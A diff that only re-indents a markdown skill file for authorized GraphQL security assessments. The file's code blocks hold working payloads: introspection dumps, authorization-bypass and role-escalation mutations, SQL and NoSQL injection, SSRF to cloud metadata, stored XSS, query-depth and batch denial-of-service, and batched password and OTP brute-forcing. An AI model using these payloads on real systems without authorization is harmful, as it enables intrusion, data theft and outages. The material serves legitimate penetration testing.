@@ -1,8 +1,8 @@
 ---
 name: performing-graphql-security-assessment
 description: Assessing GraphQL API endpoints for introspection leaks, injection attacks,
-  authorization flaws, and denial-of-service vulnerabilities during authorized security
-  tests.
+ authorization flaws, and denial-of-service vulnerabilities during authorized security
+ tests.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -57,12 +57,12 @@ Locate GraphQL endpoints and confirm GraphQL is running.
 ```bash
 # Common GraphQL endpoint paths
 for path in graphql graphiql playground query gql api/graphql \
-  v1/graphql v2/graphql graphql/console; do
-  status=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X POST -H "Content-Type: application/json" \
-    -d '{"query":"{__typename}"}' \
-    "https://target.example.com/$path")
-  echo "$path: $status"
+ v1/graphql v2/graphql graphql/console; do
+ status=$(curl -s -o /dev/null -w "%{http_code}" \
+ -X POST -H "Content-Type: application/json" \
+ -d '{"query":"{__typename}"}' \
+ "https://target.example.com/$path")
+ echo "$path: $status"
 done
 
 # Check for GraphQL IDEs (GraphiQL, Playground)
@@ -71,9 +71,9 @@ curl -s "https://target.example.com/graphql/playground" | grep -i "playground"
 
 # Fingerprint GraphQL engine
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{__typename}"}' \
-  "https://target.example.com/graphql"
+ -H "Content-Type: application/json" \
+ -d '{"query":"{__typename}"}' \
+ "https://target.example.com/graphql"
 # Response varies by engine: Apollo returns "Query", Hasura returns "query_root"
 
 # Check for WebSocket GraphQL subscriptions
@@ -87,21 +87,21 @@ Extract the full GraphQL schema to understand the API surface.
 ```bash
 # Full introspection query
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } mutationType { fields { name } } queryType { fields { name } } subscriptionType { fields { name } } } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } mutationType { fields { name } } queryType { fields { name } } subscriptionType { fields { name } } } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Comprehensive introspection query
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}' \
-  "https://target.example.com/graphql" | jq . > schema.json
+ -H "Content-Type: application/json" \
+ -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}' \
+ "https://target.example.com/graphql" | jq . > schema.json
 
 # If introspection is disabled, use clairvoyance for schema enumeration
 python3 -m clairvoyance \
-  -u "https://target.example.com/graphql" \
-  -w /usr/share/seclists/Discovery/Web-Content/graphql-field-names.txt \
-  -o discovered-schema.json
+ -u "https://target.example.com/graphql" \
+ -w /usr/share/seclists/Discovery/Web-Content/graphql-field-names.txt \
+ -o discovered-schema.json
 
 # Visualize the schema using GraphQL Voyager
 # Upload schema.json to https://graphql-kit.com/graphql-voyager/
@@ -114,36 +114,36 @@ Verify that access control is enforced at the field and object level.
 ```bash
 # Test querying all users (should require admin)
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  -d '{"query":"{ users { id email role passwordHash } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $USER_TOKEN" \
+ -d '{"query":"{ users { id email role passwordHash } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Test accessing sensitive fields on own user
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  -d '{"query":"{ user(id: 1) { id email ssn creditCard internalNotes } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $USER_TOKEN" \
+ -d '{"query":"{ user(id: 1) { id email ssn creditCard internalNotes } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Test mutation authorization (admin-only actions with user token)
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  -d '{"query":"mutation { deleteUser(id: 2) { success } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $USER_TOKEN" \
+ -d '{"query":"mutation { deleteUser(id: 2) { success } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  -d '{"query":"mutation { updateUserRole(userId: 1, role: ADMIN) { id role } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $USER_TOKEN" \
+ -d '{"query":"mutation { updateUserRole(userId: 1, role: ADMIN) { id role } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Test without any authentication
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ users { id email } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -d '{"query":"{ users { id email } }"}' \
+ "https://target.example.com/graphql" | jq .
 ```
 
 ### Step 4: Test for Injection Vulnerabilities
@@ -153,37 +153,37 @@ Assess GraphQL queries for SQL injection, NoSQL injection, and other injection t
 ```bash
 # SQL injection in GraphQL arguments
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"{ user(name: \"admin\\\" OR 1=1--\") { id email } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"query":"{ user(name: \"admin\\\" OR 1=1--\") { id email } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # NoSQL injection (MongoDB)
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"{ users(filter: {email: {$ne: \"\"}}) { id email } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"query":"{ users(filter: {email: {$ne: \"\"}}) { id email } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Test for SSRF via GraphQL
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Test for stored XSS via mutations
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"mutation { updateProfile(bio: \"<script>alert(1)</script>\") { id bio } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"query":"mutation { updateProfile(bio: \"<script>alert(1)</script>\") { id bio } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # GraphQL directive injection
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user(id: 1) { email @deprecated } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -d '{"query":"{ user(id: 1) { email @deprecated } }"}' \
+ "https://target.example.com/graphql" | jq .
 ```
 
 ### Step 5: Test for Denial of Service Attacks
@@ -193,37 +193,37 @@ Assess query complexity limits and resource consumption controls.
 ```bash
 # Deep nesting attack (query depth)
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"{ users { friends { friends { friends { friends { friends { friends { friends { name } } } } } } } } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"query":"{ users { friends { friends { friends { friends { friends { friends { friends { name } } } } } } } } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Width attack (requesting many fields)
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"{ u1: user(id:1){email} u2: user(id:2){email} u3: user(id:3){email} u4: user(id:4){email} u5: user(id:5){email} u6: user(id:6){email} u7: user(id:7){email} u8: user(id:8){email} u9: user(id:9){email} u10: user(id:10){email} }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"query":"{ u1: user(id:1){email} u2: user(id:2){email} u3: user(id:3){email} u4: user(id:4){email} u5: user(id:5){email} u6: user(id:6){email} u7: user(id:7){email} u8: user(id:8){email} u9: user(id:9){email} u10: user(id:10){email} }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Batch query attack
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '[{"query":"{ user(id:1){email} }"},{"query":"{ user(id:2){email} }"},{"query":"{ user(id:3){email} }"},{"query":"{ user(id:4){email} }"},{"query":"{ user(id:5){email} }"}]' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '[{"query":"{ user(id:1){email} }"},{"query":"{ user(id:2){email} }"},{"query":"{ user(id:3){email} }"},{"query":"{ user(id:4){email} }"},{"query":"{ user(id:5){email} }"}]' \
+ "https://target.example.com/graphql" | jq .
 
 # Fragment-based circular reference
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ users { ...A } } fragment A on User { friends { ...B } } fragment B on User { friends { ...A } }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -d '{"query":"{ users { ...A } } fragment A on User { friends { ...B } } fragment B on User { friends { ...A } }"}' \
+ "https://target.example.com/graphql" | jq .
 
 # Test for unbounded pagination
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"{ users(first: 1000000) { id email } }"}' \
-  "https://target.example.com/graphql" | jq '.data.users | length'
+ -H "Content-Type: application/json" \
+ -H "Authorization: Bearer $TOKEN" \
+ -d '{"query":"{ users(first: 1000000) { id email } }"}' \
+ "https://target.example.com/graphql" | jq '.data.users | length'
 ```
 
 ### Step 6: Test Batching for Authentication Bypass
@@ -233,33 +233,33 @@ Use query batching to brute-force credentials or bypass rate limiting.
 ```bash
 # Batch login attempts to bypass rate limiting
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '[
-    {"query":"mutation{login(email:\"admin@target.com\",password:\"password1\"){token}}"},
-    {"query":"mutation{login(email:\"admin@target.com\",password:\"password2\"){token}}"},
-    {"query":"mutation{login(email:\"admin@target.com\",password:\"password3\"){token}}"},
-    {"query":"mutation{login(email:\"admin@target.com\",password:\"admin123\"){token}}"},
-    {"query":"mutation{login(email:\"admin@target.com\",password:\"letmein\"){token}}"}
-  ]' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -d '[
+ {"query":"mutation{login(email:\"admin@target.com\",password:\"password1\"){token}}"},
+ {"query":"mutation{login(email:\"admin@target.com\",password:\"password2\"){token}}"},
+ {"query":"mutation{login(email:\"admin@target.com\",password:\"password3\"){token}}"},
+ {"query":"mutation{login(email:\"admin@target.com\",password:\"admin123\"){token}}"},
+ {"query":"mutation{login(email:\"admin@target.com\",password:\"letmein\"){token}}"}
+ ]' \
+ "https://target.example.com/graphql" | jq .
 
 # Batch OTP verification attempts
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '[
-    {"query":"mutation{verifyOTP(code:\"000000\"){success}}"},
-    {"query":"mutation{verifyOTP(code:\"000001\"){success}}"},
-    {"query":"mutation{verifyOTP(code:\"000002\"){success}}"},
-    {"query":"mutation{verifyOTP(code:\"000003\"){success}}"},
-    {"query":"mutation{verifyOTP(code:\"000004\"){success}}"}
-  ]' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -d '[
+ {"query":"mutation{verifyOTP(code:\"000000\"){success}}"},
+ {"query":"mutation{verifyOTP(code:\"000001\"){success}}"},
+ {"query":"mutation{verifyOTP(code:\"000002\"){success}}"},
+ {"query":"mutation{verifyOTP(code:\"000003\"){success}}"},
+ {"query":"mutation{verifyOTP(code:\"000004\"){success}}"}
+ ]' \
+ "https://target.example.com/graphql" | jq .
 
 # Alias-based batching (same operation, different aliases)
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"query":"mutation { a1:login(email:\"admin@test.com\",password:\"pass1\"){token} a2:login(email:\"admin@test.com\",password:\"pass2\"){token} a3:login(email:\"admin@test.com\",password:\"pass3\"){token} }"}' \
-  "https://target.example.com/graphql" | jq .
+ -H "Content-Type: application/json" \
+ -d '{"query":"mutation { a1:login(email:\"admin@test.com\",password:\"pass1\"){token} a2:login(email:\"admin@test.com\",password:\"pass2\"){token} a3:login(email:\"admin@test.com\",password:\"pass3\"){token} }"}' \
+ "https://target.example.com/graphql" | jq .
 ```
 
 ## Key Concepts
